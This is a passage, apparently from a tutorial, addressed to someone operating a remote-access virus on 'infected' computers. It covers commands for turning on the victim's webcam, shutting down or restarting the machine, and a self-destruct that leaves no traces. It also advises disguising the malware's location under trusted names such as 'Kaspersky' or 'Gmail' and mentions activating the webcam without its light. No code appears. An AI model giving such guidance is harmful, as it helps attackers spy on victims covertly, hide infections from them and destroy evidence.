However, after you have executed this for the first time, then every attack later on will be perfectly fine. In case you are wondering, deploying <b>easy.Webcam</b> will turn the webcam light on, so do this at your own risk. There are ways to turn on the webcam without turning on the light, but that depends a whole lot on the actual infected computer and is very difficult to get right.</p>

I suggest you name the location so that it sounds legitimate, like 'ECommerce', 'Kaspersky, 'Gmail', and so on. There is also <b>easy.Power</b>, which can shutdown or restart the computer and <b>easy.SelfDestruct</b> which will annihilate the virus completely, leaving no traces behind.
